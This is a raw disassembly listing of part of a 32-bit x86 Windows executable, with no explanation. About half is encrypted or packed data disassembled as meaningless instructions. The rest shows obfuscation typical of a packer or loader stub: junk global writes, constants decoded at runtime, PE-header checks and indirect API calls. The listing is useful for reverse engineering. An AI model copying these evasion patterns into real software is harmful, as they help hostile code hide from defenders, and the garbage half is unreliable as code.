  404a2e:	jl     0x404a26
  404a30:	mov    BYTE PTR ds:0x8c2940c7,ch
  404a36:	loope  0x404a15
  404a38:	sub    ebp,DWORD PTR [ebx+0x60b41589]
  404a3e:	inc    esi
  404a3f:	test   DWORD PTR ds:0xe4a6acde,ebx
  404a45:	fcmove st,st(3)
  404a47:	mov    bh,0x23
  404a49:	mov    dl,0x2e
  404a4b:	sub    BYTE PTR [edi+0x78994f02],al
  404a51:	adc    eax,0xee7e541
  404a56:	(bad)  
  404a57:	jg     0x404a6f
  404a59:	fistp  WORD PTR [eax+0x5d0ac95b]
  404a5f:	pop    ss
  404a60:	stos   BYTE PTR es:[edi],al
  404a61:	aad    0x15
  404a63:	and    ecx,ebx
  404a65:	jmp    0x404a2e
  404a67:	leave  
  404a68:	loope  0x404ae2
  404a6a:	or     ecx,DWORD PTR [ebx-0x29b40f74]
  404a70:	mov    cl,0x50
  404a72:	add    eax,esi
  404a74:	es ins BYTE PTR es:[edi],dx
  404a76:	movhps QWORD PTR [edi],xmm0
  404a79:	xor    esp,DWORD PTR [ebx+0x3b]
  404a7c:	cld    
  404a7d:	push   ss
  404a7e:	sub    BYTE PTR [esi-0x68],bh
  404a81:	xor    ah,ch
  404a83:	in     al,0x29
  404a85:	cmc    
  404a86:	mov    edi,0x9a089b9e
  404a8b:	cmp    eax,0x70e9b781
  404a90:	rcr    esp,0x90
  404a93:	xor    eax,0x6014e8ed
  404a98:	test   BYTE PTR [ecx+0x2205f331],ch
  404a9e:	pusha  
  404a9f:	mov    esp,db4
  404aa2:	retf   
  404aa3:	test   al,0x2b
  404aa5:	inc    esi
  404aa6:	(bad)  
  404aa8:	ror    ebx,cl
  404aaa:	xor    DWORD PTR [ebx-0xe],edi
  404aad:	mov    ebx,0x854e0cc3
  404ab2:	popf   
  404ab3:	inc    edx
  404ab4:	test   BYTE PTR [edx-0x86a17ac],al
  404aba:	inc    edi
  404abb:	aaa    
  404abc:	push   ebp
  404abd:	int    0x32
  404abf:	dec    eax
  404ac0:	push   ecx
  404ac1:	sub    al,0x42
  404ac3:	retf   0xba2f
  404ac6:	sub    BYTE PTR [ecx+0x27a6b57a],al
  404acc:	out    dx,al
  404acd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404ace:	dec    esp
  404acf:	fisub  DWORD PTR [edi-0x3319b152]
  404ad5:	into   
  404ad6:	jns    0x404a91
  404ad8:	push   ebp
  404ad9:	fidiv  WORD PTR [eax+0x4b]
  404adc:	add    eax,edx
  404ade:	dec    ebx
  404adf:	mov    BYTE PTR [esi+0x1],bh
  404ae2:	sub    ebp,esi
  404ae4:	lea    esp,[esi]
  404ae6:	adc    DWORD PTR [edi+0x32eae84e],0x10
  404aed:	out    dx,al
  404aee:	into   
  404aef:	lock jmp FWORD PTR [ebx-0x4944efa2]
  404af6:	pushf  
  404af7:	test   eax,0x8856ceaf
  404afc:	shl    BYTE PTR [ebx],0x72
  404aff:	outs   dx,BYTE PTR ds:[esi]
  404b00:	jmp    0x9aa9:0xaac6350c
  404b07:	dec    eax
  404b08:	jne    0x404b57
  404b0a:	add    edx,DWORD PTR [eax]
  404b0c:	in     al,0x95
  404b0e:	push   ds
  404b0f:	call   0x5f03:0x8956d41c
  404b16:	aad    0x31
  404b18:	mov    ds:0xc0046b8a,eax
  404b1d:	clc    
  404b1e:	mov    WORD PTR [ebp-0x45],ds
  404b21:	or     al,0x40
  404b23:	setbe  BYTE PTR [edi-0x58]
  404b27:	cmp    al,0x97
  404b29:	xchg   esi,eax
  404b2a:	jno    0x404b02
  404b2c:	push   esp
  404b2d:	sub    edi,DWORD PTR [edi+0x7]
  404b30:	push   esp
  404b31:	stc    
  404b32:	push   es
  404b33:	mov    al,ds:0x79fba1d9
  404b38:	dec    esi
  404b39:	int    0x1a
  404b3b:	test   al,0x5d
  404b3d:	add    dl,BYTE PTR [ebx]
  404b3f:	in     eax,0xb4
  404b41:	jg     0x404b4c
  404b43:	icebp  
  404b44:	outs   dx,BYTE PTR ds:[esi]
  404b45:	stos   DWORD PTR es:[edi],eax
  404b46:	ja     0x404bbc
  404b48:	mov    dl,0x13
  404b4a:	pop    esp
  404b4b:	clc    
  404b4c:	std    
  404b4d:	xchg   ecx,eax
  404b4e:	clc    
  404b4f:	adc    ecx,DWORD PTR [eax-0x19e6498b]
  404b55:	call   0xd7917e91
  404b5a:	xchg   BYTE PTR [ecx],al
  404b5c:	xchg   ebx,eax
  404b5d:	inc    eax
  404b5e:	jne    0x404b96
  404b60:	push   0x46
  404b62:	cmp    BYTE PTR [eax+0x49e902c7],dh
  404b68:	xchg   esi,eax
  404b69:	add    ebp,ebx
  404b6b:	xchg   esp,eax
  404b6c:	cmp    eax,0x744fbeba
  404b71:	mov    BYTE PTR [eax+eax*2+0x11],0xa0
  404b76:	(bad)  
  404b77:	std    
  404b78:	add    eax,0x1f2a190c
  404b7d:	or     al,0x6f
  404b7f:	mov    edi,0x5f4a220b
  404b84:	xor    edx,DWORD PTR [edi]
  404b86:	mov    eax,0x2cc0782b
  404b8b:	dec    ebp
  404b8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404b8d:	js     0x404bee
  404b8f:	es add al,0x3a
  404b92:	in     al,0xa7
  404b94:	mov    WORD PTR ds:0xb763,ds
  404b99:	(bad)  
  404b9a:	mov    al,0xf1
  404b9c:	iret   
  404b9d:	je     0x404b48
  404b9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404ba0:	mov    DWORD PTR [ebx],eax
  404ba2:	dec    esp
  404ba3:	lock fwait
  404ba5:	mov    ebx,0x931079c7
  404baa:	adc    eax,0x60a21a83
  404baf:	sbb    al,0x72
  404bb1:	mov    ebp,0xefb1f99b
  404bb6:	xchg   edx,eax
  404bb7:	add    DWORD PTR [ebx-0x41f442ed],ebx
  404bbd:	dec    esi
  404bbe:	xchg   BYTE PTR [si],al
  404bc1:	add    BYTE PTR [ebx],bl
  404bc3:	sub    BYTE PTR [eax-0x3b492c0d],ah
  404bc9:	fimul  DWORD PTR [ebp-0x4df51bf5]
  404bcf:	es pop ss
  404bd1:	or     DWORD PTR [edi],0xffffffdc
  404bd4:	sbb    eax,edx
  404bd6:	dec    edi
  404bd7:	out    dx,eax
  404bd8:	cmp    DWORD PTR [eax],ecx
  404bda:	call   FWORD PTR [edx+ebp*8-0x30249491]
  404be1:	repz test al,0x5a
  404be4:	cwde   
  404be5:	icebp  
  404be6:	and    BYTE PTR [esi+0x3],dh
  404be9:	and    ebp,ebx
  404beb:	mov    esp,esi
  404bed:	adc    bh,BYTE PTR [eax+0x79]
  404bf0:	jmp    FWORD PTR ds:0x4078d539
  404bf6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404bf7:	call   0xd291:0x13ce60ca
  404bfe:	xor    BYTE PTR [ebp+0x5],dl
  404c01:	das    
  404c02:	hlt    
  404c03:	xchg   ecx,esi
  404c05:	sub    edi,DWORD PTR gs:[edi]
  404c08:	dec    ecx
  404c09:	inc    edx
  404c0a:	(bad)  
  404c0b:	jmp    0x73abebc2
  404c10:	push   es
  404c11:	cld    
  404c12:	sbb    dh,BYTE PTR [ebx+0x2e]
  404c15:	sbb    ah,dh
  404c17:	test   al,0xac
  404c19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404c1a:	popa   
  404c1b:	das    
  404c1c:	mov    es,WORD PTR [esp+edx*8+0x33]
  404c20:	fcmovb st,st(5)
  404c22:	add    al,0xba
  404c24:	and    ch,dh
  404c26:	aam    0x85
  404c28:	(bad)  
  404c29:	jle    0x404c07
  404c2b:	in     al,0x6f
  404c2d:	push   ebx
  404c2e:	js     0x404c48
  404c30:	mov    DWORD PTR [ebx],0xc91c5474
  404c36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404c37:	inc    ebx
  404c38:	outs   dx,BYTE PTR ds:[esi]
  404c39:	xlat   BYTE PTR ds:[ebx]
  404c3a:	xchg   edi,eax
  404c3b:	fisttp QWORD PTR [edi]
  404c3d:	sub    DWORD PTR [ecx+0x712cb6be],edi
  404c43:	add    dh,bl
  404c45:	push   ss
  404c46:	mov    ebp,0xf65821c1
  404c4b:	cmp    al,BYTE PTR [edx]
  404c4d:	pushf  
  404c4e:	out    0x15,al
  404c50:	cld    
  404c51:	jne    0x404c3d
  404c53:	retf   
  404c54:	sub    ecx,DWORD PTR [eax+0x6f]
  404c57:	inc    edi
  404c58:	xchg   ecx,eax
  404c59:	imul   esi,ebx,0x20
  404c5c:	repnz rcr BYTE PTR [edx+0x2fac8a47],1
  404c63:	jmp    DWORD PTR [eax]
  404c65:	and    ebp,DWORD PTR [ebp+0x6d]
  404c68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404c69:	jne    0x404c54
  404c6b:	xchg   ebx,eax
  404c6c:	mov    ch,0x8f
  404c6e:	daa    
  404c6f:	add    DWORD PTR [ecx-0x3a],0xffffff99
  404c73:	in     eax,dx
  404c74:	xchg   esi,eax
  404c75:	dec    edx
  404c76:	cmc    
  404c77:	dec    esi
  404c78:	push   esi
  404c79:	dec    edi
  404c7a:	xor    ecx,ebp
  404c7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404c7d:	xor    BYTE PTR [eax-0x6743349b],0xcc
  404c84:	sub    ecx,edx
  404c86:	ret    
  404c87:	arpl   WORD PTR [ecx],sp
  404c89:	pop    es
  404c8a:	std    
  404c8b:	jl     0x404cbe
  404c8d:	cmc    
  404c8e:	cmp    dl,dl
  404c90:	in     al,dx
  404c91:	(bad)
  404c94:	pop    ebp
  404c95:	in     al,dx
  404c96:	(bad)  
  404c97:	fiadd  WORD PTR ds:0x545f9a3d
  404c9d:	(bad)  
  404c9f:	imul   BYTE PTR [edx-0x51]
  404ca2:	retf   0x6a11
  404ca5:	mov    dh,0x9
  404ca7:	cld    
  404ca8:	xor    DWORD PTR [edx-0x6fa9f0b3],esi
  404cae:	xor    ebp,DWORD PTR [ecx-0x7a]
  404cb1:	pushf  
  404cb2:	jne    0x404cd0
  404cb4:	xchg   ebp,eax
  404cb5:	fwait
  404cb6:	sbb    al,0x60
  404cb8:	or     BYTE PTR [edx+0x7b],dh
  404cbb:	push   edi
  404cbc:	mov    ecx,0xd38a4871
  404cc1:	sahf   
  404cc2:	add    edx,DWORD PTR [edx+0x23]
  404cc5:	ficomp WORD PTR [edi+eax*4]
  404cc8:	jmp    0x404c66
  404cca:	pusha  
  404ccb:	ins    DWORD PTR es:[edi],dx
  404ccc:	and    DWORD PTR [ebp-0x6a],esi
  404ccf:	inc    esi
  404cd0:	sbb    BYTE PTR [edi+ebp*1-0x7f],dl
  404cd4:	mov    cs,WORD PTR [ebp-0x1cf21d2]
  404cda:	adc    ah,bh
  404cdc:	sbb    al,0x75
  404cde:	sbb    cl,BYTE PTR [ebp-0x5]
  404ce1:	pop    edi
  404ce2:	dec    edi
  404ce3:	out    0xe9,eax
  404ce5:	cmc    
  404ce6:	add    eax,ecx
  404ce8:	jns    0x404cb9
  404cea:	sti    
  404ceb:	jmp    0x404cfe
  404ced:	jmp    0x637c:0x9394bc66
  404cf4:	lods   al,BYTE PTR ds:[esi]
  404cf5:	nop
  404cf6:	push   esp
  404cf7:	push   edx
  404cf8:	aas    
  404cf9:	and    al,0x93
  404cfb:	mov    bh,0x33
  404cfd:	inc    ebp
  404cfe:	cs add eax,0xb0b23d3c
  404d04:	and    eax,0xe1e41daf
  404d09:	and    ebp,DWORD PTR ds:0x9d1ceaba
  404d0f:	sub    al,0x44
  404d11:	lods   eax,DWORD PTR ds:[esi]
  404d12:	sbb    DWORD PTR [ebp-0xaf79247],eax
  404d18:	rol    BYTE PTR [ecx+0x1c96e05c],cl
  404d1e:	(bad)  
  404d1f:	lock push esp
  404d21:	xlat   BYTE PTR ds:[ebx]
  404d22:	and    BYTE PTR [eax],0xdf
  404d25:	and    BYTE PTR [ebx-0x2a62b884],dl
  404d2b:	inc    esp
  404d2c:	iret   
  404d2d:	shl    DWORD PTR [eax+0x4ab96f4],1
  404d33:	jle    0x404d5f
  404d35:	xor    DWORD PTR [eax-0x4e],ebx
  404d38:	mov    ebp,0x8ec35623
  404d3d:	rol    edx,cl
  404d3f:	mov    fs,ecx
  404d41:	mov    al,0xa3
  404d43:	je     0x404cdf
  404d45:	xchg   ebx,eax
  404d46:	rcl    DWORD PTR ds:0x8234f6c8,cl
  404d4c:	adc    BYTE PTR [esi+0x7e434ab3],al
  404d52:	xor    BYTE PTR [ecx],bh
  404d54:	push   ds
  404d55:	loop   0x404d3c
  404d57:	pop    ss
  404d58:	xchg   BYTE PTR [esi-0xecb2005],dl
  404d5e:	loop   0x404d4e
  404d60:	scas   eax,DWORD PTR es:[edi]
  404d61:	pop    esp
  404d62:	inc    esi
  404d63:	push   ds
  404d64:	dec    edi
  404d65:	hlt    
  404d66:	(bad)
  404d6a:	inc    esi
  404d6b:	outs   dx,DWORD PTR ds:[esi]
  404d6c:	inc    ebx
  404d6d:	cmp    ebp,ebp
  404d6f:	rcr    BYTE PTR [edi],cl
  404d71:	mov    ebp,0x1c3aab82
  404d76:	clc    
  404d77:	imul   eax,DWORD PTR [ebx+0x60ed9b6e],0x7f5ed44a
  404d81:	ret    
  404d82:	inc    ebx
  404d83:	in     eax,dx
  404d84:	jae    0x404deb
  404d86:	jg     0x404d15
  404d88:	js     0x404d4a
  404d8a:	ins    BYTE PTR es:[edi],dx
  404d8b:	imul   esp,ebp,0x1e
  404d8e:	mov    ds:0x726482da,al
  404d93:	ins    BYTE PTR es:[edi],dx
  404d94:	cmp    edi,esp
  404d96:	sub    bl,0x83
  404d99:	into   
  404d9a:	mov    edx,0xa3366fa5
  404d9f:	mov    ah,0xb6
  404da1:	pusha  
  404da2:	sbb    BYTE PTR [edx-0x38],dh
  404da5:	mov    BYTE PTR [ecx+0x1e],bl
  404da8:	in     eax,0x2c
  404daa:	jae    0x404dea
  404dac:	lock shr DWORD PTR [eax],cl
  404daf:	shl    DWORD PTR [ecx+0x3d1c4a4b],1
  404db5:	ret    
  404db6:	dec    edx
  404db7:	gs iret 
  404db9:	jecxz  0x404d4f
  404dbb:	fisubr WORD PTR [eax+0x1]
  404dbe:	or     ah,dl
  404dc0:	(bad)  
  404dc1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404dc2:	pop    ss
  404dc3:	cdq    
  404dc4:	addr16 jle 0x404e3c
  404dc7:	nop
  404dc8:	in     al,0xd7
  404dca:	xchg   edi,eax
  404dcb:	push   eax
  404dcc:	mov    al,ds:0x7497ce51
  404dd1:	mov    al,0xba
  404dd3:	sub    BYTE PTR [edx-0x783e4a53],dh
  404dd9:	xor    al,0x25
  404ddb:	dec    edx
  404ddc:	jmp    0x404df9
  404dde:	das    
  404ddf:	in     al,dx
  404de0:	xchg   BYTE PTR [edx+esi*4],cl
  404de3:	mov    bl,0x7d
  404de5:	or     ebx,esi
  404de7:	cmp    eax,esp
  404de9:	jne    0x404e46
  404deb:	or     al,0x1d
  404ded:	stos   DWORD PTR es:[edi],eax
  404dee:	add    al,0x97
  404df1:	push   ss
  404df2:	add    eax,0x9f4212a6
  404df7:	or     bh,BYTE PTR [ebx]
  404df9:	xchg   ecx,eax
  404dfa:	jecxz  0x404e19
  404dfc:	mov    eax,0x23e2daf2
  404e01:	imul   esp,eax,0xffffffe0
  404e04:	inc    ebp
  404e05:	pop    ss
  404e06:	scas   eax,DWORD PTR es:[edi]
  404e07:	push   0x60f50b63
  404e0c:	aam    0x7b
  404e0e:	push   esp
  404e0f:	scas   eax,DWORD PTR es:[edi]
  404e10:	xor    al,0xb5
  404e12:	fsubr  st,st(1)
  404e14:	shr    DWORD PTR [edi-0x57ddf19f],0x4a
  404e1b:	inc    edx
  404e1c:	test   DWORD PTR [ebp+0x569c6065],esp
  404e22:	fidivr DWORD PTR [edx+0x1b]
  404e25:	cs dec esi
  404e27:	and    al,0x7f
  404e29:	stos   DWORD PTR es:[edi],eax
  404e2a:	pop    es
  404e2b:	pop    eax
  404e2c:	les    edx,FWORD PTR [eax+0xd]
  404e2f:	cdq    
  404e30:	mov    cl,0xa9
  404e32:	mov    WORD PTR [ecx],es
  404e34:	sbb    bl,dl
  404e36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e37:	ja     0x404e13
  404e39:	gs call 0xc43f:0x38580fb
  404e41:	jne    0x404ebd
  404e43:	xchg   ebp,eax
  404e44:	fnstsw WORD PTR [eax+0x30f641e6]
  404e4a:	sub    al,0x68
  404e4c:	in     eax,dx
  404e4d:	nop
  404e4e:	or     ebx,DWORD PTR [edx-0x30]
  404e51:	jnp    0x404e11
  404e53:	push   edi
  404e54:	call   0xc6927e0d
  404e59:	or     esp,esp
  404e5b:	out    dx,eax
  404e5c:	push   es
  404e5d:	xchg   ecx,eax
  404e5e:	imul   eax,ebx,0xd8bd204f
  404e64:	es pop esi
  404e66:	jl     0x404df2
  404e68:	or     al,cl
  404e6a:	mov    ds:0x3707dd8b,al
  404e6f:	and    BYTE PTR [edx-0x61],0x9c
  404e73:	pop    eax
  404e74:	(bad)  
  404e75:	inc    ecx
  404e76:	mov    edx,DWORD PTR [esi+0x7d]
  404e79:	shr    BYTE PTR [ebp-0x13368339],cl
  404e7f:	in     al,dx
  404e80:	(bad)  
  404e81:	pop    eax
  404e82:	push   edx
  404e83:	dec    eax
  404e84:	rcr    DWORD PTR [edx+0x65093df4],1
  404e8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404e8b:	lds    ebx,FWORD PTR [eax]
  404e8d:	jae    0x404e3c
  404e8f:	call   0xf80e:0x728f974a
  404e96:	dec    edi
  404e97:	adc    eax,0x93a6d707
  404e9d:	stc    
  404e9e:	adc    BYTE PTR [ecx],dl
  404ea0:	dec    esp
  404ea1:	(bad)  
  404ea2:	sbb    edx,edx
  404ea4:	les    esi,FWORD PTR [ecx+eax*1]
  404ea7:	ror    ebx,0xc1
  404eaa:	or     BYTE PTR [edi],bl
  404eac:	je     0x404ea5
  404eae:	xchg   ecx,eax
  404eaf:	cmp    ah,BYTE PTR [eax+0x14]
  404eb2:	dec    ebx
  404eb3:	push   ds
  404eb4:	push   cs
  404eb5:	push   0x50
  404eb7:	in     al,dx
  404eb8:	rcl    DWORD PTR [ebx-0x5d19a4f1],0xcd
  404ebf:	scas   eax,DWORD PTR es:[edi]
  404ec0:	aam    0x3b
  404ec2:	jecxz  0x404f09
  404ec4:	mov    ds:0x2e44a2ed,eax
  404ec9:	mov    al,0xd2
  404ecb:	cdq    
  404ecc:	(bad)  
  404ecd:	adc    bl,BYTE PTR [ebp+0x78]
  404ed0:	ret    0xf200
  404ed3:	adc    eax,0x578dc2d
  404ed8:	rcr    BYTE PTR [eax-0x2c],cl
  404edb:	add    BYTE PTR fs:[ebx+0x3b],bh
  404edf:	pushw  cs
  404ee1:	mov    al,ds:0x3c9120e7
  404ee6:	call   0x3f12f9d5
  404eeb:	sub    al,0x7f
  404eed:	pop    edx
  404eee:	sub    bh,BYTE PTR [ebx-0x658fb7fd]
  404ef4:	cli    
  404ef5:	jmp    0x404ea4
  404ef7:	inc    ebx
  404ef8:	sub    BYTE PTR gs:[ebp-0x404674f3],cl
  404eff:	mov    eax,es
  404f01:	arpl   WORD PTR [ecx+edi*8+0x24074d9c],cx
  404f08:	repnz (bad) 
  404f0a:	xchg   edi,eax
  404f0b:	mov    ah,0x93
  404f0d:	out    0x84,al
  404f0f:	ja     0x404ed6
  404f11:	xchg   ebx,eax
  404f12:	push   es
  404f13:	pop    esi
  404f14:	aam    0x0
  404f16:	xchg   edi,eax
  404f17:	pop    ebx
  404f18:	hlt    
  404f19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404f1a:	dec    edx
  404f1b:	pop    ebx
  404f1c:	push   0x2cbd08a0
  404f21:	popf   
  404f22:	add    cl,BYTE PTR [edx-0x1e02d1c9]
  404f28:	and    eax,DWORD PTR [eax-0x5d]
  404f2b:	(bad)  
  404f2c:	hlt    
  404f2d:	sub    BYTE PTR [ecx],dl
  404f2f:	mov    eax,DWORD PTR [ebp-0x4]
  404f32:	mov    edi,DWORD PTR [ebp-0x8]
  404f35:	xor    edi,edx
  404f37:	add    edi,esi
  404f39:	mov    esi,DWORD PTR [ebp+0x8]
  404f3c:	imul   edi,ecx
  404f3f:	mov    ebx,DWORD PTR [ebp+0xc]
  404f42:	xor    eax,edx
  404f44:	add    eax,ecx
  404f46:	mov    al,BYTE PTR [ebx+eax*1+0x3272dd]
  404f4d:	mov    BYTE PTR [edi+esi*1],al
  404f50:	mov    eax,DWORD PTR [ebp-0x8]
  404f53:	mov    esi,DWORD PTR [ebp+0x10]
  404f56:	xor    eax,edx
  404f58:	xor    ebx,ebx
  404f5a:	add    esi,0xfabdbeed
  404f60:	adc    ebx,0xffffffff
  404f63:	lea    ecx,[ecx+eax*1+0x3272dd]
  404f6a:	xor    edi,edi
  404f6c:	xor    esi,0x8a29a127
  404f72:	xor    ebx,0x0
  404f75:	mov    eax,ecx
  404f77:	add    eax,0xfabdbeed
  404f7c:	adc    edi,0xffffffff
  404f7f:	xor    eax,0x8a29a127
  404f84:	xor    edi,0x0
  404f87:	cmp    eax,esi
  404f89:	jne    0x402b72
  404f8f:	cmp    edi,ebx
  404f91:	jne    0x402b72
  404f97:	mov    eax,0xf89c85b2
  404f9c:	pop    ebx
  404f9d:	pop    edi
  404f9e:	pop    esi
  404f9f:	leave  
  404fa0:	ret    0xc
  404fa3:	push   ebp
  404fa4:	mov    ebp,esp
  404fa6:	push   ecx
  404fa7:	add    eax,DWORD PTR ds:0x42a000
  404fad:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  404fb4:	sbb    DWORD PTR ds:0x42b008,0x61d9
  404fbe:	mov    eax,DWORD PTR [ebp+0x8]
  404fc1:	xor    DWORD PTR ds:0x42c018,0x2d2e
  404fcb:	mov    al,BYTE PTR [eax]
  404fcd:	add    al,0xb
  404fcf:	xor    al,0x71
  404fd1:	cmp    al,0x29
  404fd3:	mov    DWORD PTR ds:0x429010,0x6c7b
  404fdd:	jne    0x40507a
  404fe3:	mov    eax,DWORD PTR [ebp+0x8]
  404fe6:	or     edx,DWORD PTR ds:0x42900c
  404fec:	mov    ecx,DWORD PTR [ebp+0x8]
  404fef:	and    DWORD PTR ds:0x42b00c,0x0
  404ff9:	mov    edx,DWORD PTR ds:0x42b00c
  404fff:	inc    edx
  405000:	mov    DWORD PTR ds:0x42b00c,edx
  405006:	cmp    DWORD PTR ds:0x42b00c,0x1a
  40500d:	jne    0x40501e
  405013:	push   0x42900c
  405018:	call   DWORD PTR ds:0x42ed75
  40501e:	cmp    DWORD PTR ds:0x42b00c,0x15
  405025:	jb     0x404ff9
  40502b:	or     DWORD PTR ds:0x42d008,0x1488
  405035:	add    ecx,DWORD PTR [eax+0x3c]
  405038:	mov    edx,0x7510896
  40503d:	mov    DWORD PTR [ebp+0x8],ecx
  405040:	mov    eax,DWORD PTR [ebp-0x4]
  405043:	xor    eax,edx
  405045:	push   esi
  405046:	mov    esi,DWORD PTR ds:0x42d000
  40504c:	and    DWORD PTR ds:0x42a00c,esi
  405052:	mov    esi,DWORD PTR [ebp+0x8]
  405055:	mov    ecx,0x3272dd
  40505a:	add    eax,ecx
  40505c:	cmp    DWORD PTR [esi+0x54],eax
  40505f:	pop    esi
  405060:	je     0x40506e
  405066:	mov    eax,DWORD PTR [ebp+0x8]
  405069:	jmp    0x405087
  40506e:	mov    eax,DWORD PTR [ebp-0x4]
  405071:	xor    eax,edx
  405073:	add    eax,ecx
  405075:	jmp    0x405087
  40507a:	mov    eax,DWORD PTR [ebp-0x4]
  40507d:	xor    eax,0x7510896
  405082:	add    eax,0x3272dd
  405087:	leave  
  405088:	ret    0x4
  40508b:	push   ebp
  40508c:	mov    ebp,esp
  40508e:	sub    esp,0x78
  405091:	push   ebx
  405092:	push   esi
  405093:	push   edi
  405094:	push   0x1f
  405096:	lea    eax,[ebp-0x78]
  405099:	xor    DWORD PTR ds:0x429018,0x42a014
  4050a3:	push   eax
  4050a4:	push   0x0
  4050a6:	mov    DWORD PTR ds:0x429010,0x21c3
  4050b0:	call   DWORD PTR ds:0x42ed69
  4050b6:	add    DWORD PTR ds:0x429024,0x42c000
  4050c0:	push   0x97898797
  4050c5:	call   DWORD PTR ds:0x42ed2d
  4050cb:	adc    DWORD PTR ds:0x42b018,0x6ca1
  4050d5:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  4050dc:	mov    DWORD PTR [ebp-0x14],0xf89c85b2
  4050e3:	mov    ecx,DWORD PTR [ebp-0x4]
  4050e6:	mov    ebx,0x7510896
  4050eb:	add    DWORD PTR ds:0x42a014,0x255d
  4050f5:	xor    ecx,ebx
  4050f7:	or     DWORD PTR ds:0x429000,0x7ff8
  405101:	mov    eax,0x3272dd
  405106:	add    ecx,eax
  405108:	mov    DWORD PTR [ebp-0x1c],ecx
  40510b:	not    DWORD PTR ds:0x42c018
  405111:	mov    ecx,DWORD PTR [ebp+0x14]
  405114:	test   ecx,ecx
  405116:	mov    DWORD PTR ds:0x42a00c,0x3f58
  405120:	je     0x40513a
  405126:	inc    ecx
  405127:	mov    ecx,DWORD PTR [ebp+0x14]
  40512a:	and    DWORD PTR ds:0x429014,0x1a66
  405134:	mov    ecx,DWORD PTR [ecx]
  405136:	dec    edi
  405137:	mov    DWORD PTR [ebp-0x1c],ecx
  40513a:	add    DWORD PTR ds:0x42901c,edx
  405140:	mov    ecx,0x7665
  405145:	and    DWORD PTR ds:0x42c008,0x0
  40514f:	jmp    0x405161
  405154:	mov    edi,DWORD PTR ds:0x42c008
  40515a:	inc    edi
  40515b:	mov    DWORD PTR ds:0x42c008,edi
  405161:	cmp    DWORD PTR ds:0x42c008,0x10
  405168:	jae    0x405192
  40516e:	cmp    DWORD PTR ds:0x42c008,0x1f
  405175:	jne    0x40518b
  40517b:	push   0x399e
  405180:	push   0x848f
  405185:	call   DWORD PTR ds:0x42ed35
  40518b:	jmp    0x405154
  405190:	xor    edi,edi
  405192:	imul   edx,eax
  405195:	movzx  esi,BYTE PTR ds:0x42c010
  40519c:	xor    DWORD PTR ds:0x42c004,esi
  4051a2:	mov    esi,0x76532
  4051a7:	add    edx,ecx
  4051a9:	and    DWORD PTR ds:0x42a018,0x0
  4051b3:	mov    edi,DWORD PTR ds:0x42a018
  4051b9:	inc    edi
  4051ba:	mov    DWORD PTR ds:0x42a018,edi
  4051c0:	cmp    DWORD PTR ds:0x42a018,0x6
  4051c7:	jne    0x4051e0
  4051cd:	push   0x8802
  4051d2:	push   0x429004
  4051d7:	push   DWORD PTR [ebp-0x24]
  4051da:	call   DWORD PTR ds:0x42ed39
  4051e0:	cmp    DWORD PTR ds:0x42a018,0x5
  4051e7:	jne    0x4051fa
  4051ed:	mov    edi,DWORD PTR ds:0x42a018
  4051f3:	inc    edi
  4051f4:	mov    DWORD PTR ds:0x42a018,edi
  4051fa:	cmp    DWORD PTR ds:0x42a018,0x10
  405201:	jb     0x4051b3
  405207:	and    DWORD PTR ds:0x42d00c,0x0
  405211:	jmp    0x405223
  405216:	mov    edi,DWORD PTR ds:0x42d00c
  40521c:	inc    edi
  40521d:	mov    DWORD PTR ds:0x42d00c,edi
  405223:	cmp    DWORD PTR ds:0x42d00c,0x15
  40522a:	jae    0x405278
  405230:	cmp    DWORD PTR ds:0x42d00c,0xa
  405237:	jne    0x40524d
  40523d:	push   0x42e05b
  405242:	push   0x42e010
  405247:	call   DWORD PTR ds:0x42ed3d
  40524d:	cmp    DWORD PTR ds:0x42d00c,0x9
  405254:	jne    0x405269
  40525a:	xor    edi,edi
  40525c:	or     edi,DWORD PTR ds:0x42d00c
  405262:	inc    edi
  405263:	mov    DWORD PTR ds:0x42d00c,edi
  405269:	jmp    0x405216
  40526e:	adc    DWORD PTR ds:0x42b000,0x4b16
  405278:	xchg   esi,ecx
  40527a:	xor    ecx,DWORD PTR ds:0x42a00c
  405280:	mov    edi,0x54354
  405285:	sub    edx,edi
  405287:	sbb    ecx,0x55bb
  40528d:	mov    ecx,DWORD PTR [ebp-0x4]
  405290:	sub    DWORD PTR ds:0x42a01c,edx
  405296:	xor    ecx,ebx
  405298:	mov    esi,DWORD PTR ds:0x42a018
  40529e:	and    esi,DWORD PTR ds:0x429000
  4052a4:	mov    DWORD PTR ds:0x42a018,esi
  4052aa:	add    ecx,eax
  4052ac:	mov    DWORD PTR [ebp-0x8],ecx
  4052af:	and    DWORD PTR ds:0x42b010,0x0
  4052b9:	jmp    0x4052cb
  4052be:	mov    esi,DWORD PTR ds:0x42b010
  4052c4:	inc    esi
  4052c5:	mov    DWORD PTR ds:0x42b010,esi
  4052cb:	cmp    DWORD PTR ds:0x42b010,0x1e
  4052d2:	jae    0x405313
  4052d8:	cmp    DWORD PTR ds:0x42b010,0x4
  4052df:	jne    0x4052f4
  4052e5:	push   DWORD PTR [ebp-0x1c]
  4052e8:	push   DWORD PTR [ebp-0x20]
  4052eb:	push   DWORD PTR [ebp-0xc]
  4052ee:	call   DWORD PTR ds:0x42ed41
  4052f4:	cmp    DWORD PTR ds:0x42b010,0x3
  4052fb:	jne    0x40530e
  405301:	mov    esi,DWORD PTR ds:0x42b010
  405307:	inc    esi
  405308:	mov    DWORD PTR ds:0x42b010,esi
  40530e:	jmp    0x4052be
  405313:	mov    ecx,DWORD PTR [ebp-0x14]
  405316:	xor    ecx,ebx
  405318:	add    ecx,eax
  40531a:	and    DWORD PTR ds:0x42a00c,0x4b6f
  405324:	mov    DWORD PTR [ebp-0x24],ecx
  405327:	mov    DWORD PTR ds:0x429024,0x1f
